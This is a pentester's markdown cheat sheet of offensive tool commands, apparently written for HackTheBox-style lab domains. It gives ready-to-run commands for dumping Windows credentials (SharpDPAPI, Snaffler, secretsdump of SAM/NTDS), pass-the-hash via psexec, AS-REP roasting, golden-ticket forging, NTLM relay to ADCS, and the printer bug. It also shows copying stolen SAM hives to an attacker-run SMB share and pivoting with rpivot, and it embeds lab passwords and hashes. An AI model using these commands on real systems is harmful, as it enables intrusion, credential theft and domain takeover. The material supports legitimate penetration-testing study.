---
type: tool
category: scripts
tags:
  - scripts
---
# .EXE
## SharpDPAPI.exe
Following command lets you retrieve the passwords stored in the `Credentials Manager`. The password needs to match with the user who executed the cmd:
```cmd
SharpDPAPI.exe credentials /password:PASSWORD
```
^18b326

## Snaffler.exe
https://github.com/SnaffCon/Snaffler
Enumerate System for Credentials stored in files and copy them to specified folder:
```cmd
Snaffler.exe -s -m "C:\temp\loot" -o "C:\temp\snaffler.log"
```
^89e064

Specify which share to scan `-i` and retrieves a list of ad-users to check against `-u`
```cmd
Snaffler.exe -u -i \\DC01.inlanefreight.local\ADMIN$ -o snaf-out
```


## Winpeas
File location:
```bash
cd /run/media/breezy/PortableSSD/THM/Scripts/SharpCollection
```
#### Enumerate Windows with `WinPeas` 
Recommended with `powershell` , because colorcode doesn't work in dm:
```powershell
.\winPEAS.exe
```

# Python

## enum4Linux-ng.py/run/media/breezy/PortableSSD/THM/Scripts/XSStrike

#### Default scan / All
Can return a large amount of information about domain infrastructures and smb.
Example with **A**ggressive scan:
```bash
sudo enum4linux-ng 10.129.5.101 -A -oA /scanresults
```

#### Retrieve Password Policies - enum4linux-ng
The big advantage of using `enum4linux-ng` for password policy enumeration is, that it utilizes several protocols: 
```bash
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

#### Enum Users - enum4linux-ng
```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
## gettgtpkinit.py
```python
python3 /run/media/breezy/PortableSSD/THM/Scripts/gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```
^67293c

```python
python3 /run/media/breezy/PortableSSD/THM/Scripts/gettgtpkinit.py -cert-pfx DC01.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

^57dd50

## Impacket

### Psexec (SMB)
`local Admin needed`
Execute pass the hash from Linux on Windows targets:
```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

### GetNPUsers.py
```bash
impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

^c40b20

### mssqlclient.py
#### Windows user
```python
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py mssqlsvc@10.129.203.12 -windows-auth
```

^d1d004

#### Local user
Login to MSSQL-Server via python mssql-client:
```python
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py username@10.129.156.39 
```
^36c4b9

### Lookupsid.py
#### Performing Domain-SID Brute Forcing - IMPACKET lookupsid.py
```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```


### ntlmrelayx.py
Use an intercepted NTLM-authentication and forward it to the `ADCS`:
```bash
impacket-ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```


### onesixtyone.py
Bruteforce community strings:
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.166.108
```
^ed337d

### secretsdump.py

#### LSA
```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

^e38c79

^9d0297
#### NTDS
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

^c66c6c
#### Dump Admin Password-Hash with DC-Ccache
```bash 
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

#### Dump all NTLM-Hashes and Kerberos-Keys - secretsdump.py
```bash
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

### raiseChild.py
Impacket also has the tool [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. With the `-store-ticket` parameter, we will also save the ticket, which makes it very handy for using other linux-tools, to perform e.g.`dc-sync`:
```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm -
```

### rpcdump.py
RPC-Dump of all listening services:
```python
python3 /usr/share/doc/python3-impacket/examples/rpcdump.py 10.129.202.41 | tee - rpcdump.txt
```
^d54b7c
### ticketer.py
#### Forging a Golden Ticket - IMPACKET ticketer.py
The ticket will be saved down to our system as a [credential cache (ccache)](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file, which is a file used to hold Kerberos credentials. Setting the `KRB5CCNAME` environment variable tells the system to use this file for Kerberos authentication attempts.
```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
Now we only need to set `KRB5CCNAME` in order to use the ticket: [[Linux#Loading Ccache file]]

### smbserver.py
#### Guest login (no Credentials)
1. Create smbserver on local/attack machine:
```bash 
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
2. Copy file from the SMB server (in this example Windows):
```cmd 
copy \\192.168.220.133\share\nc.exe
```
Or move files to the smbshare:
```cmd
move sam.save \\10.10.15.95\share
```

#### With credentials
1. Start smbserver with credentials:
```bash
sudo impacket-smbserver share /tmp/smbshare -smb2support -username admin -password JustaPass
```

2. Map it to device (windows):
```cmd
net use \\10.10.15.95\share /user:admin JustaPass
```

3. Copy entire folders to share:
```cmd
robocopy Documents \\10.10.15.95\share /E
```
If we are on a `PowerShell` it's recommended to execute the cmd, for the copy-command:
```powershell
cmd /c copy C:\system.save \\10.10.15.206\share\system.save
```

### TicketConverter
The `TicketConverter` module in "Impacket" can be used to convert `Kerberos` Linux-Tickets into Windows-Tickets and vice versa:
```bash
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
## KeytabExtract.py
KeyTabExtract is a little utility to help extract valuable information from 502 type .keytab files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type and NTLM Hash.
### Extracting KeyTabe hashes
```bash
python3 /run/media/breezy/PortableSSD/THM/Scripts/KeyTabExtract/keytabextract.py carlos.keytab
```

## printerbug.py
```python
python3 /run/media/breezy/PortableSSD/THM/Scripts/printerbug.py INLANEFREIGHT.LOCAL/wwhite:'package5shores_topher1'@10.129.234.174 10.10.15.95
```
## ReconSpider.py

**Saves Output to the file "results.json".**

This is a tool made for scrapping websites. The spider will crawl the target and collect valuable information such as Email-Addresses and various website-resources:
```python
python3 /run/media/breezy/PortableSSD/THM/Scripts/ReconSpider.py http://inlanefreight.com 
```
^fae765

## Rpivot (Python2 ONLY)
#### Dynamic forwarder to HTTP-Server (Rpivot)
1. Start `server.py` on the `Attack Host`
```bash
python2 /run/media/breezy/PortableSSD/THM/Scripts/rpivot/server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
2. Upload entire `Rpivot-Suite` to the `Pivot Host` and execute `client.py`:
```bash
python2 client.py --server-ip 10.10.15.52 --server-port 9999
```
3. Browse to the target using  firefox over`proxychains`:
```bash
proxychains firefox-esr 172.16.5.135:80
```
## samrdump.py
Is a script which helps enum domain user, groups, policies, etc.

## ssh-audit.py
Enum SSH service via script:
```python
./ssh-audit.py 10.129.14.132
```

^2f433f

## uploadserver 
An `uploadserver` is an http webserver which allows fileuploads:
```python
python3 -m uploadserver
```

## Windapsearch
https://github.com/ropnop/windapsearch
#### Enum Users - Windapsearch (LDAP)
`Windapsearchis` another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries:
```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

## XSStrike
#### XSS-Discovery - XSStrike.py
https://github.com/s0md3v/XSStrike
`XSStrike` is a ptyhon script for `XSS-Discovery`:
```bash
python3 /run/media/breezy/PortableSSD/THM/Scripts/XSStrike/xsstrike.py -u "154.57.164.78:40746"
```

# Ruby

### username-anarchy.rb

^ae4ba4
#### With Namelist
This script is useful for enumerating possible usernames.
Example:
1. Save the know names like this:
```txt
John Marston
Carol Johnson
Jennifer Stapleton
```
2. Run the script on the username-file:
```bash
/run/media/breezy/PortableSSD/THM/Scripts/username-anarchy/username-anarchy -i names > user.list
```
3. Output will be something like this:
```txt
john
johnmarston
john.marston
johnmars
johnm
j.marston
jmarston
mjohn
m.john
marstonj
marston
marston.j
marston.john
jm
...

```

#### With single name
```bash
/run/media/breezy/PortableSSD/THM/Scripts/username-anarchy/username-anarchy Jane Smitch > jane.txt
```